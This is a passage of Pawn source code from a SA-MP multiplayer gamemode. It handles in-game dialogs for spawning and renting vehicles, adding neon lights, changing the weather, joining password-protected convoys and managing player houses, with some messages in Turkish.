		    PlaneList_Create(playerid);
		}
		default: // Player chooses a Plane
		{
		    // Setup local variables
	    	new Float:x, Float:y, Float:z, Float:rot, PlaneIndex, msg[128], vID, pName[24];
			new engine,lights,alarm,doors,bonnet,boot,objective;

			// FirstPlane is the index of the first Plane in the list, so select the proper index when a Plane is chosen by the player
			PlaneIndex = APlayerData[playerid][DialogPlaneFirstPlane] + listitem;

			// Get the player's position and name
			GetPlayerPos(playerid, x, y, z);
			GetPlayerFacingAngle(playerid, rot);
			GetPlayerName(playerid, pName, 24);

   			if(APlayerData[playerid][PlayerLevel] < 5)
			{
			    new model = APlanes[PlaneIndex][PlaneModel];
	    		if(model == 520 || model == 425 || model == 432 || model == 447 || model == 476) return SendClientMessage(playerid, -1, "{FF0000}Bu aracý indirmeye yetkiniz yok!");
			}

			// Spawn the vehicle based on the selection in the list with a random color
			// Also set max-fuel and save the model for the vehicle
			vID = Vehicle_Create(APlanes[PlaneIndex][PlaneModel], x, y, z, rot, random(126), random(126), 600);
			// Put the player in the vehicle
			PutPlayerInVehicle(playerid, vID, 0);
			// Turn on the engine and lights
			GetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vID, engine, 1, alarm, doors, bonnet, boot, objective);
			// Store the player's current location and interior-id, otherwise anti-airbreak hack code could kick you
			GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
			APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);
			// Inform the player about it
			format(msg, 128, TXT_PlayerSpawnedVehicle, pName, vID, APlanes[PlaneIndex][PlaneModel], x, y, z);
			SendClientMessageToAll(0xFFFFFFFF, msg);
			// Also, after spawning a vehicle, reset FirstPlane (so next time, the list starts from the start)
			APlayerData[playerid][DialogPlaneFirstPlane] = 0;
		}
	}

	return 1;
}



// Process the Trailer dialog
Dialog_Trailer(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response)
	{
		// Reset the FirstTrailer (so the list won't start at an unexpected location in the list, but back at the start of the list)
		APlayerData[playerid][DialogTrailerFirstTrailer] = 0;
		return 1; // Exit the function
	}

	// Process the selected listitem
	switch (listitem)
	{
		case 10: // Player chooses the empty line between the Trailerlist and "Next...", so refresh the current list
		{
		    // Refresh the current list of Trailers and let the player choose one (show dialog)
		    TrailerList_Create(playerid);
			// Exit the function
			return 1;
		}
		case 11: // Player chooses "Next..."
		{
		    // Add 10 to the FirstTrailer, so the list will start further down the array (will show the next 10 Trailers)
		    APlayerData[playerid][DialogTrailerFirstTrailer] = APlayerData[playerid][DialogTrailerFirstTrailer] + 10;
		    // Create a new list of Trailers and show the dialog
		    TrailerList_Create(playerid);
		}
		default: // Player chooses a Trailer
		{
		    // Setup local variables
	    	new Float:x, Float:y, Float:z, TrailerIndex, msg[128], vID, pName[24];

			// FirstTrailer is the index of the first Trailer in the list, so select the proper index when a Trailer is chosen by the player
			TrailerIndex = APlayerData[playerid][DialogTrailerFirstTrailer] + listitem;

			// Get the player's position and name
			GetPlayerPos(playerid, x, y, z);
			GetPlayerName(playerid, pName, 24);

			// Spawn the vehicle based on the selection in the list with a random color, and spawn it 10 units north of the player
			// Also set max-fuel and save the model for the vehicle
			vID = Vehicle_Create(ATrailers[TrailerIndex][TrailerModel], x, y + 10.0, z + 5.0, 0.0, random(126), random(126), 600);
			// Inform the player about it
			format(msg, 128, TXT_PlayerSpawnedVehicle, pName, vID, ATrailers[TrailerIndex][TrailerModel], x, y + 10.0, z + 5.0);
			SendClientMessageToAll(0xFFFFFFFF, msg);
			// Also, after spawning a vehicle, reset FirstTrailer (so next time, the list starts from the start)
			APlayerData[playerid][DialogTrailerFirstTrailer] = 0;
		}
	}

	return 1;
}



// Process the boat dialog
Dialog_Boat(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new Float:x, Float:y, Float:z, Float:rot, CarID, msg[120], vID, pName[24];
	new engine,lights,alarm,doors,bonnet,boot,objective;

	// Get the player's position and name
	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, rot);
	GetPlayerName(playerid, pName, 24);

	// Spawn the boat based on the selection in the list
	switch (listitem)
	{
		case 0: CarID = VehicleCoastguard; // Coastguard
		case 1: CarID = VehicleDinghy; // Dinghy
		case 2: CarID = VehicleJetmax; // Jetmax
		case 3: CarID = VehicleLaunch; // Launch
		case 4: CarID = VehicleMarquis; // Marquis
		case 5: CarID = VehiclePredator; // Predator
		case 6: CarID = VehicleReefer; // Reefer
		case 7: CarID = VehicleSpeeder; // Speeder
		case 8: CarID = VehicleSquallo; // Squallo
		case 9: CarID = VehicleTropic; // Tropic
	}

	// Spawn the vehicle based on the selection in the list with a random color
	// Also set max-fuel and save the model for the vehicle
	vID = Vehicle_Create(CarID, x, y, z, rot, random(126), random(126), 600);
	// Put the player in the vehicle
	PutPlayerInVehicle(playerid, vID, 0);
	// Turn on the engine and lights
	GetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
	SetVehicleParamsEx(vID, engine, 1, alarm, doors, bonnet, boot, objective);
	// Store the player's current location and interior-id, otherwise anti-airbreak hack code could kick you
	GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
	APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);
	// Inform all players about it
	format(msg, 120, TXT_PlayerSpawnedVehicle, pName, vID, CarID, x, y, z);
	SendClientMessageToAll(0xFFFFFFFF, msg);

	return 1;
}



// Process the neon dialog
Dialog_Neon(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new vehicleid;

	// Get the player's vehicle
	vehicleid = GetPlayerVehicleID(playerid);

	// Check if the player chose anothet option than "Remove neons"
	if (listitem != 7)
	{
		// Check if the vehicle already has neon lights attached
	    if (AVehicleData[vehicleid][NeonObjectModel] != 0)
	    {
	        // Delete the current neon-lights and clear the variables
            DestroyObject(AVehicleData[vehicleid][NeonLeft]);
            DestroyObject(AVehicleData[vehicleid][NeonRight]);
            AVehicleData[vehicleid][NeonLeft] = 0;
            AVehicleData[vehicleid][NeonRight] = 0;
            AVehicleData[vehicleid][NeonObjectModel] = 0;
	    }
	}

	// Process the option chosen from the dialog
	if (listitem == 0) // Police Light
	{
	    AVehicleData[vehicleid][NeonLeft] = CreateObject(18646,0,0,0,0,0,0);
	    AVehicleData[vehicleid][NeonRight] = CreateObject(18646,0,0,0,0,0,0);
		AVehicleData[vehicleid][NeonObjectModel] = 18646;
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonLeft], vehicleid, -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonRight], vehicleid, 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		GameTextForPlayer(playerid, "~p~Police lights~w~ have been added to your vehicle", 3500, 5);
	}

	if (listitem == 1) // Red light
	{
	    AVehicleData[vehicleid][NeonLeft] = CreateObject(18647,0,0,0,0,0,0);
	    AVehicleData[vehicleid][NeonRight] = CreateObject(18647,0,0,0,0,0,0);
		AVehicleData[vehicleid][NeonObjectModel] = 18647;
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonLeft], vehicleid, -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonRight], vehicleid, 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		GameTextForPlayer(playerid, "~p~Red lights~w~ have been added to your vehicle", 3500, 5);
	}

	if (listitem == 2) // Blue light
	{
	    AVehicleData[vehicleid][NeonLeft] = CreateObject(18648,0,0,0,0,0,0);
	    AVehicleData[vehicleid][NeonRight] = CreateObject(18648,0,0,0,0,0,0);
		AVehicleData[vehicleid][NeonObjectModel] = 18648;
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonLeft], vehicleid, -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonRight], vehicleid, 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		GameTextForPlayer(playerid, "~p~Blue lights~w~ have been added to your vehicle", 3500, 5);
	}

	if (listitem == 3) // Green Light
	{
	    AVehicleData[vehicleid][NeonLeft] = CreateObject(18649,0,0,0,0,0,0);
	    AVehicleData[vehicleid][NeonRight] = CreateObject(18649,0,0,0,0,0,0);
		AVehicleData[vehicleid][NeonObjectModel] = 18649;
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonLeft], vehicleid, -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonRight], vehicleid, 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		GameTextForPlayer(playerid, "~p~Green lights~w~ have been added to your vehicle", 3500, 5);
	}

	if (listitem == 4) // Yellow Light
	{
	    AVehicleData[vehicleid][NeonLeft] = CreateObject(18650,0,0,0,0,0,0);
	    AVehicleData[vehicleid][NeonRight] = CreateObject(18650,0,0,0,0,0,0);
		AVehicleData[vehicleid][NeonObjectModel] = 18650;
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonLeft], vehicleid, -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonRight], vehicleid, 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		GameTextForPlayer(playerid, "~p~Yellow lights~w~ have been added to your vehicle", 3500, 5);
	}

	if (listitem == 5) // Pink Light
	{
	    AVehicleData[vehicleid][NeonLeft] = CreateObject(18651,0,0,0,0,0,0);
	    AVehicleData[vehicleid][NeonRight] = CreateObject(18651,0,0,0,0,0,0);
		AVehicleData[vehicleid][NeonObjectModel] = 18651;
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonLeft], vehicleid, -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonRight], vehicleid, 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		GameTextForPlayer(playerid, "~p~Pink lights~w~ have been added to your vehicle", 3500, 5);
	}

	if (listitem == 6) // White Light
	{
	    AVehicleData[vehicleid][NeonLeft] = CreateObject(18652,0,0,0,0,0,0);
	    AVehicleData[vehicleid][NeonRight] = CreateObject(18652,0,0,0,0,0,0);
		AVehicleData[vehicleid][NeonObjectModel] = 18652;
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonLeft], vehicleid, -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(AVehicleData[vehicleid][NeonRight], vehicleid, 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		GameTextForPlayer(playerid, "~p~White lights~w~ have been added to your vehicle", 3500, 5);
	}

	if (listitem == 7) // Remove neons
	{
        // Delete the current neon-lights and clear the variables
        DestroyObject(AVehicleData[vehicleid][NeonLeft]);
        DestroyObject(AVehicleData[vehicleid][NeonRight]);
        AVehicleData[vehicleid][NeonLeft] = 0;
        AVehicleData[vehicleid][NeonRight] = 0;
		AVehicleData[vehicleid][NeonObjectModel] = 0;
		GameTextForPlayer(playerid, "Neons have been removed from your vehicle", 3500, 5);
	}

	return 1;
}



// Process the chosen vehicleclass to show the actual vehicle-list of this vehicleclass
Dialog_RentProcessClass(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new CarList[1000], DialogTitle[128];

	// Set the player's chosen vehicle-class based on the listitem he chose (add 1 as the vehicleclass starts at 1)
	APlayerData[playerid][DialogRentVClass] = listitem + 1;

	// Add all vehicles of the same class to the list
	for (new i; i < sizeof(ABuyableVehicles); i++)
	{
		// Check if the vehicle in the list has the same class as requested
		if (ABuyableVehicles[i][VehicleClass] == APlayerData[playerid][DialogRentVClass])
		{
			// Add the carname to the list and it's price
			format(CarList, 1000, "%s%s%s ($%i)", CarList, "\n", ABuyableVehicles[i][CarName], ABuyableVehicles[i][Price] / 100); // Add the name of the next car to the list on the next line
		}
	}

	// Check if the list is empty
	if (strlen(CarList) == 0)
	{
		// Send the player a message that all vehicles have been disabled of the chosen class (no vehicles in the array of this class)
		SendClientMessage(playerid, 0xFFFFFFFF, TXT_BuyRentCarEmptyList);
		// Exit the function (don't ask to choose a vehicle)
		return 1;
	}

	// Set a title for the dialog based on the requested vehicleclass
	switch (APlayerData[playerid][DialogRentVClass])
	{
		case VClassBike: format(DialogTitle, 128, TXT_RentBike);
		case VClassBoat: format(DialogTitle, 128, TXT_RentBoat);
		case VClassConvertible: format(DialogTitle, 128, TXT_RentConvertible);
		case VClassHelicopter: format(DialogTitle, 128, TXT_RentHelicopter);
		case VClassIndustrial: format(DialogTitle, 128, TXT_RentIndustrial);
		case VClassLowRider: format(DialogTitle, 128, TXT_RentLowRider);
		case VClassOffRoad: format(DialogTitle, 128, TXT_RentOffRoad);
		case VClassPlane: format(DialogTitle, 128, TXT_RentPlane);
		case VClassPublic: format(DialogTitle, 128, TXT_RentPublicService);
		case VClassRCVehicle: format(DialogTitle, 128, TXT_RentRC);
		case VClassSaloons: format(DialogTitle, 128, TXT_RentSaloon);
		case VClassSportCar: format(DialogTitle, 128, TXT_RentSport);
		case VClassStationCar: format(DialogTitle, 128, TXT_RentStationWagon);
		case VClassTrailer: format(DialogTitle, 128, TXT_RentTrailer);
		case VClassUnique: format(DialogTitle, 128, TXT_RentUnique);
	}

	// Ask which car the player wants to have by showing the dialog
	ShowPlayerDialog(playerid, DialogRentCar, DIALOG_STYLE_LIST, DialogTitle, CarList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

	return 1;
}



// This dialog gives the chosen vehicle to the player (bought or rented)
Dialog_RentCar(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new Counter, Name[24], Float:x, Float:y, Float:z, Msg[128];

	// Loop through the entire list of buyable vehicles
	for (new i; i < sizeof(ABuyableVehicles); i++)
	{
		// Check if the vehicle in the list has the same class as requested
		if (ABuyableVehicles[i][VehicleClass] == APlayerData[playerid][DialogRentVClass])
		{
		    // Check if this is the vehicle that the player chose
		    if (Counter == listitem)
			{
			    // Check if the player has enough money to afford renting this vehicle
			    if (APlayerData[playerid][PlayerMoney] >= (ABuyableVehicles[i][Price] / 100))
			    {
					// Check if the player already has a rented vehicle
					if (APlayerData[playerid][RentedVehicleID] != 0)
					{
						// Clear the data for the already rented vehicle
						AVehicleData[APlayerData[playerid][RentedVehicleID]][Model] = 0;
						AVehicleData[APlayerData[playerid][RentedVehicleID]][Fuel] = 0;
						AVehicleData[APlayerData[playerid][RentedVehicleID]][Owned] = false;
						AVehicleData[APlayerData[playerid][RentedVehicleID]][Owner] = 0;
						AVehicleData[APlayerData[playerid][RentedVehicleID]][PaintJob] = 0;
						for (new j; j < 14; j++)
						{
							AVehicleData[APlayerData[playerid][RentedVehicleID]][Components][j] = 0;
						}
						// Destroy the vehicle
						if(Flashing[APlayerData[playerid][RentedVehicleID]] == true)
						{
	    					KillTimer(FlashTime[APlayerData[playerid][RentedVehicleID]]);
	    					Flashing[APlayerData[playerid][RentedVehicleID]] = false;
						}
						DestroyVehicle(APlayerData[playerid][RentedVehicleID]);
						// Send the player a message that his previously rented vehicle has been replaced by the new one
						SendClientMessage(playerid, 0xFFFFFFFF, TXT_AlreadyRentedVehicle);
					}

					// Create the vehicle and link it to the player's account
					GetPlayerPos(playerid, x, y, z);
				    APlayerData[playerid][RentedVehicleID] = CreateVehicle(ABuyableVehicles[i][CarModel], x, y, z, 0.0, -1, -1, 600);
					// Also set owndership data
					AVehicleData[APlayerData[playerid][RentedVehicleID]][Model] = ABuyableVehicles[i][CarModel];
					AVehicleData[APlayerData[playerid][RentedVehicleID]][Fuel] = MaxFuel;
					AVehicleData[APlayerData[playerid][RentedVehicleID]][Owned] = true;
					GetPlayerName(playerid, Name, sizeof(Name));
					format(AVehicleData[APlayerData[playerid][RentedVehicleID]][Owner], 24, Name);
					// Put the player in the vehicle
					PutPlayerInVehicle(playerid, APlayerData[playerid][RentedVehicleID], 0);
					// Turn on the engine
					new engine,lights,alarm,doors,bonnet,boot,objective;
					GetVehicleParamsEx(APlayerData[playerid][RentedVehicleID], engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(APlayerData[playerid][RentedVehicleID], engine, lights, alarm, doors, bonnet, boot, objective);
					// Store the player's current location and interior-id, otherwise anti-airbreak hack code could kick you
					GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
					APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);
					// Let the player pay for renting the vehicle
					APlayerData[playerid][PlayerMoney] = APlayerData[playerid][PlayerMoney] - (ABuyableVehicles[i][Price] / 100);
					// Let the player know he rented a vehicle
					format(Msg, 128, TXT_PlayerRentsVehicle, ABuyableVehicles[i][CarName], (ABuyableVehicles[i][Price] / 100));
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				}
				else // The player has not enough money to rent this vehicle
				    SendClientMessage(playerid, 0xFFFFFFFF, TXT_RentingTooExpensive);

				// Stop looking for the vehicle, as it's found and given to the player already
				return 1;
			}
		    else // The player chose another vehicle from the same class, keep looking for another one
		        Counter++;
		}
	}

	return 1;
}



// Process the weather dialog
Dialog_Weather(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new WeatherID;

	// Select the weather
	switch (listitem)
	{
		case 0: WeatherID = 0; // Normal
		case 1: WeatherID = 8; // Stormy
		case 2: WeatherID = 9; // Foggy
		case 3: WeatherID = 11; // Scorching hot
		case 4: WeatherID = 16; // Dull, cloudy, rainy
		case 5: WeatherID = 19; // Sandstorm
		case 6: WeatherID = 20; // Green Fog
		case 7: WeatherID = 33; // Dark, cloudy, brown
		case 8: WeatherID = 39; // Extremely bright
		case 9: WeatherID = 43; // Dark toxic clouds
		case 10: WeatherID = 44; // Black & white sky
	}

	// Set the weather
    SetWeather(WeatherID);
    // Inform the player about it
	SendClientMessage(playerid, 0xFFFFFFFF, TXT_ChangedWeather);

	return 1;
}

// Process the caroption dialog
Dialog_CarOption(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

    // Setup local variables
	new vehicleid, engine, lights, bool:alarm, bool:doors, bool:bonnet, bool:boot, bool:objective;

	// Get the player's vehicle
	vehicleid = GetPlayerVehicleID(playerid);

	// Get the current status of the vehicle
	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);

	// Select the weather
	switch (listitem)
	{
		case 0: SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
		case 1: SetVehicleParamsEx(vehicleid, engine, 1 - lights, alarm, doors, bonnet, boot, objective);
		case 2:
		{
			if (alarm == true)
				SetVehicleParamsEx(vehicleid, engine, lights, false, doors, bonnet, boot, objective);
			else
				SetVehicleParamsEx(vehicleid, engine, lights, true, doors, bonnet, boot, objective);
		}
		case 3:
		{
			if (doors == true)
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, false, bonnet, boot, objective);
			else
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, true, bonnet, boot, objective);
		}
		case 4:
		{
			if (bonnet == true)
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, false, boot, objective);
			else
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, true, boot, objective);
		}
		case 5:
		{
			if (boot == true)
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, false, objective);
			else
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, true, objective);
		}
		case 6:
		{
			if (objective == true)
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, false);
			else
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, true);
		}
	}

	return 1;
}



// This function processes the convoy dialog
Dialog_SelectConvoy(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new Convoy;

	// The convoy-id is automatically the listitem
	Convoy = listitem;

	// Check the status of the selected convoy to determine what to do
	switch (AConvoys[Convoy][Status])
	{
	    case CONVOY_EMPTY: // Convoy isn't started yet, this is a free convoy
		{
			Convoy_Create(playerid, Convoy); // Try to create the convoy
		}
	    case CONVOY_OPEN: // Convoy has been created but still open for new members to join
		{
		    if(AConvoys[Convoy][ConvoySifreli] == true)
		    {
		        GirilecekConvoy[playerid] = Convoy;
		        ShowPlayerDialog(playerid, DialogSelectConvoySifre, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Konvoya Gir", "{DDDDDD}Konvoya girebilmek için þifresini girmeniz gerekiyor:", "Gir", "Ýptal");
		    }else{
		    	Convoy_Join(playerid, Convoy); // Try to join the convoy
			}
		}
	    case CONVOY_FULL: // Convoy is full (10 members)
		{
			SendClientMessage(playerid, 0xFFFFFFFF, TXT_ConvoyFull);
		}
	    case CONVOY_CLOSED: // Convoy has started already (the leader already chose a job, causing the convoy to close)
		{
			SendClientMessage(playerid, 0xFFFFFFFF, TXT_ConvoyEnRoute);
		}
	}

	return 1;
}

// This function processes the convoy dialog
Dialog_SelectConvoySifre(playerid, response, inputtext[])
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;
	if(!strlen(inputtext)) return SendClientMessage(playerid, -1, "{FF0000}Konvoy þifresini girmediniz!"), ShowPlayerDialog(playerid, DialogSelectConvoySifre, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Konvoya Gir", "{DDDDDD}Konvoya girebilmek için þifresini girmeniz gerekiyor:", "Gir", "Ýptal");

	// Setup local variables
	new Convoy;

	// The convoy-id is automatically the listitem
	Convoy = GirilecekConvoy[playerid];

	if(!strcmp(AConvoys[Convoy][ConvoySifre], inputtext, true))
	{
		switch (AConvoys[Convoy][Status])
		{
	    	case CONVOY_EMPTY: // Convoy isn't started yet, this is a free convoy
			{
				SendClientMessage(playerid, -1, "{FF0000}Konvoy sahibi konvoyu kapatmýþ!");
			}
	    	case CONVOY_OPEN: // Convoy has been created but still open for new members to join
			{
 				Convoy_Join(playerid, Convoy); // Try to join the convoy
			}
	    	case CONVOY_FULL: // Convoy is full (10 members)
			{
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_ConvoyFull);
			}
	    	case CONVOY_CLOSED: // Convoy has started already (the leader already chose a job, causing the convoy to close)
			{
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_ConvoyEnRoute);
			}
		}
	}else{
	    SendClientMessage(playerid, -1, "{FF0000}Konvoy þifresini hatalý girdiniz!");
	    ShowPlayerDialog(playerid, DialogSelectConvoySifre, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Konvoya Gir", "{DDDDDD}Konvoya girebilmek için þifresini girmeniz gerekiyor:", "Gir", "Ýptal");
	}

	return 1;
}

// This function processes the housemenu dialog
Dialog_HouseMenu(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new UpgradeList[2000], HouseID, DialogTitle[200], Counter, UpgradePrice, Msg[128], CarSlot;

	// Get the HouseID of the house where the player is
	HouseID = APlayerData[playerid][CurrentHouse];

	// Select an option based on the selection in the list
	switch(listitem)
	{
	    case 0: // Change house name
	    {
			// Only the house-owner can use this option
			if (House_PlayerIsOwner(playerid, HouseID) == 1)
			{
		        format(DialogTitle, 200, TXT_DialogOldHouseName, AHouseData[HouseID][HouseName]);
				ShowPlayerDialog(playerid, DialogHouseNameChange, DIALOG_STYLE_INPUT, DialogTitle, TXT_DialogEnterNewHouseName, TXT_DialogButtonSelect, TXT_DialogButtonCancel);
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Sadece Ev Sahibi bunu kulanabilir");
	    }
	    case 1: // Upgrade the house
	    {
			// Only the house-owner can use this option
			if (House_PlayerIsOwner(playerid, HouseID) == 1)
			{
		        // Check if it's possible to upgrade further
				if (AHouseData[HouseID][HouseLevel] < AHouseData[HouseID][HouseMaxLevel])
				{
					// Add only the upgrades above the current house-level to the upgradelist
					for (new i = AHouseData[HouseID][HouseLevel] + 1; i <= AHouseData[HouseID][HouseMaxLevel]; i++)
					{
					    Counter++; // Add 1 to the counter each time an upgrade is added to the upgradelist
					    UpgradePrice = ((AHouseData[HouseID][HousePrice] * Counter) / 100) * HouseUpgradePercent;
					    // Add the upgrade-info in green if the player can afford it, and in red if he cannot afford it
						if (APlayerData[playerid][PlayerMoney] >= UpgradePrice)
							format(UpgradeList, 2000, "%s{00FF00}%s (level %i)\t\t$%i\n", UpgradeList, AHouseInteriors[i][InteriorName], i, UpgradePrice);
						else
							format(UpgradeList, 2000, "%s{FF0000}%s (level %i)\t\t$%i\n", UpgradeList, AHouseInteriors[i][InteriorName], i, UpgradePrice);
					}

			        // Show another dialog to let the player select which upgrade he wants for his house
					ShowPlayerDialog(playerid, DialogUpgradeHouse, DIALOG_STYLE_LIST, TXT_DialogSelectHouseUpgrade, UpgradeList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, TXT_HouseReachedMaxLevel);
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Sadece Ev Sahibi bunu kulanabilir");
	    }
		
		case 2: // Sell house
		{
			// Only the house-owner can use this option
			if (House_PlayerIsOwner(playerid, HouseID) == 1)
			{
			    // Setup local variables
			    new bool:HouseHasCars = false;

				// Check if the house has any cars assigned to it
				for (CarSlot = 0; CarSlot < 11; CarSlot++)
				    if (AHouseData[HouseID][VehicleIDs][CarSlot] != 0)
				        HouseHasCars = true;

				// Check if all house-cars have been sold (all slots are empty)
				if (HouseHasCars == false)
				{
				    format(Msg, 128, TXT_SureSellHouse, House_CalcSellPrice(HouseID));
					ShowPlayerDialog(playerid, DialogSellHouse, DIALOG_STYLE_MSGBOX, TXT_AreYouSure, Msg, TXT_DialogButtonYes, TXT_DialogButtonNo);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, TXT_CannotSellHouseWithCars);
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Sadece Ev Sahibi bunu kulanabilir");
		}
	    case 3: // Open the house to the public (everyone can enter it)
	    {
			// Only the house-owner can use this option
			if (House_PlayerIsOwner(playerid, HouseID) == 1)
			{
			    // Open the house to the public
				AHouseData[HouseID][HouseOpened] = true;
				// Let the player know he opened the house to the public
				SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Evi Herkeze Actin");
				}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Sadece Ev Sahibi bunu yapabilir");
	    }
	    case 4: // Close the house to the public (only the owner can enter it)
	    {
			// Only the house-owner can use this option
			if (House_PlayerIsOwner(playerid, HouseID) == 1)
			{
			    // Close the house to the public
				AHouseData[HouseID][HouseOpened] = false;
				// Let the player know he closed the house to the public
				SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Evi Herkeze kapatin");
				}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Sadece Ev Sahibi bunu yapabilir");
	    }
	    case 5: // Exit the house
	    {
			House_Exit(playerid, HouseID);
	    }
	}

	return 1;
}

// This function processes the house-upgrade menu
Dialog_UpgradeHouse(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Get the HouseID of the house where the player is
	new HouseID = APlayerData[playerid][CurrentHouse];
	// Calculate the new house-level based on the selection in the list (the first entry is 1 level higher than the current house-level)
	new hLevel = listitem + 1 + AHouseData[HouseID][HouseLevel];
	// Calculate the price for upgrading
	new Payment = ((AHouseData[HouseID][HousePrice] * (listitem + 1)) / 100) * HouseUpgradePercent;

	// Check if the player can afford it
	if (APlayerData[playerid][PlayerMoney] >= Payment)
	{
		// Upgrade the house
		AHouseData[HouseID][HouseLevel] = hLevel;
		// Set the worldid so other players cannot see him anymore
		SetPlayerVirtualWorld(playerid, 1000 + playerid);
		// Set the player inside the new interior of the house
		SetPlayerInterior(playerid, AHouseInteriors[hLevel][InteriorID]);
		// Set the position of the player at the spawn-location of the house's interior
		SetPlayerPos(playerid, AHouseInteriors[hLevel][IntX], AHouseInteriors[hLevel][IntY], AHouseInteriors[hLevel][IntZ]);

		// Let the player pay for the upgrade
		new Msg[128];
		RewardPlayer(playerid, -Payment, 0);
		format(Msg, 128, TXT_PlayerUpgradedHouse, AHouseData[HouseID][HouseLevel], Payment);
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);

		// Also update the 3DText at the entrance of the house
		House_UpdateEntrance(APlayerData[playerid][CurrentHouse]);

		// Save the player-file (and his houses)
		Oyuncu_Kaydet(playerid);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_CannotAffordUpgrade);

	return 1;
}



// Check which house the player chose, and port him to it
Dialog_GoHome(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new HouseIndex, HouseID;

	// The listitem directly indicates the house-index
	HouseIndex = listitem;
	HouseID = APlayerData[playerid][Houses][HouseIndex];

	// Check if this is a valid house (HouseID != 0)
	if (HouseID != 0)
	{
		// Get the coordinates of the house's entrance
		SetPlayerPos(playerid, HouseData[HouseID][houseX], HouseData[HouseID][houseY], HouseData[HouseID][houseZ]);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NoHouseInSlot);

	return 1;
}

// Let the player change the name of his house
